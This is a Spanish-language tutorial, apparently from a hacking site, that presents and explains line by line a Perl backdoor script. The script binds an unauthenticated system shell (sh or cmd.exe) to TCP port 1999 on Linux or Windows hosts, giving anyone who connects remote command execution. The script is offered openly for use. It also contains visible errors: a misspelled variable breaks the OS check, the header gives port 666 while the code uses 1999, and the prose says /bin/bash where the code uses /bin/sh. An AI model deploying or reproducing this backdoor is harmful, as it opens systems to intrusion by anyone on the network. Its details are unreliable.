Para leer este artículo no es necesario que sean expertos en Perl, aunque sería conveniente que supieran lo básico del lenguaje. Si bien muchos critican a Perl y aquellas personas que lo usan para codear herramientas como esta, u otras cosas parecidas (como un scanner de puertos), a mí me parece que es demasiado prático y portátil (de hecho es multiplataforma).

¿Qué es un backdoor?

Un backdoor es un programa que deja una "puerta trasera" (back door) en un sistema. Esta puerta trasera puede ser, por ejemplo, un puerto abierto en el que está bindeada una shell. De esta manera, si intentáramos conectarnos de cualquier forma a ese puerto, obtendríamos la shell, con la que podríamos ejecutar comandos en el servidor remoto.

Codeando el backdoor

Como dice el título, en esta parte vamos a programar el backdoor. A continuación les dejo el código y después lo explico.

backdoor.pl:
#!/usr/bin/perl

###########################################
#      NST Backdoor by Paisterist                                                       #
#      Usage: perl nstback.pl                                                            #
#                                                                                                       #
#      Note: the amphersand is for background execution in Linux   #
#                                                                                                      #
#      Connect: telnet host 666                                                         #
###########################################
use Socket;

$port= 1999;
$proto="tcp";
$ckeck=`uname &`;
$check_win=`ver`;
if ($check =~ "Linux") {
system("clear");
$system="/bin/sh";
} else {
if ($check_win =~ /XP/){
system("cls");
$system="C:\\Windows\\system32\\cmd.exe";
}
else {
system("cls");
$system="C:\\Windows\\system32\\command.com";
}
}

socket(SERVER, AF_INET, SOCK_STREAM, $proto);
setsockopt(SERVER, SOL_SOCKET, SO_REUSEADDR, pack(l, 1)) or die;
bind(SERVER, sockaddr_in($port, INADDR_ANY)) or die;
listen(SERVER, "10") or die;
for(; $paddr = accept(CLIENT, SERVER); close CLIENT) {
open(STDIN, ">&CLIENT");
open(STDOUT, ">&CLIENT");
open(STDERR, ">&CLIENT");
system($system);
close(STDIN);
close(STDOUT);
close(STDERR);
}


En primer lugar, con el #!/usr/bin/perl definimos la ruta del intérprete de Perl (en Windows hubiera sido algo así como C:\perl\bin\perl.exe). Después de eso, con use Socket; aclaramos que vamos a usar el módulo para el uso de Sockets. Luego definimos el puerto en el que se binderá la shell y el protocolo que usaremos para la conexión (TCP). Una cosa importante a remarcar es que no hay que usar un puerto entre 1 y 1024 ya que la apertura de cualquiera de estos puertos requiere privilegios de root.

Con el código que sigue chequeamos el sistema operativo del sistema. Para eso ejecutamos el comando uname y, si como salida de Linux la shell será /bin/bash. En caso contrario, nos fijamos qué versión de Windows se está usando mediante el comando ver.

Después de esto empieza la conexión. Con la línea socket(SERVER, AF_INET, SOCK_STREAM, $proto); creamos la socket. En primer lugar ponemos el nombre de la socket, SOCKET, en segundo lugar la familia de direcciones del protocolo TPC/IP, AF_INET (si usáramos dominios Unix sería AF_UNIX), en tercer lugar SOCK_STREAM indica que se usará el protocolo TCP (SOCK_DGRAM para UDP) y por último, especificamos el puerto en el que se creará la socket.

A continuación bindeamos la socket a un puerto, mediante la función bind() que recibe el nombre de la socket creada, SOCKET, y sockaddr_in($port, INADDR_ANY) que indica que se bindeará la socket en todos los puertos para los que fue declarada (en este caso el 1999). Luego ponemos el programa a la escucha mediante la función listen() que recibe como primer parámetro el nombre de la socket y como último la cantidad máxima de conexiones simultáneas, 10 en este caso (esto pueden modificarlo ustedes a su gusto).

Si alguien trata de conectarse por el puerto al que bindeamos la socket, lo aceptamos con accept() que recibe el nombre de la nueva socket, en este caso CLIENT, y el nombre de la socket que recibe la conexión, SOCKET en este caso.

Por último, el bucle del final del código lo que hace es, por cada conexión entrante, abrir los flujos de entrada, salida y de error y ejecuta la shell con la función system(), que ejecuta comandos en el servidor. Después de eso, cierra los flujos.
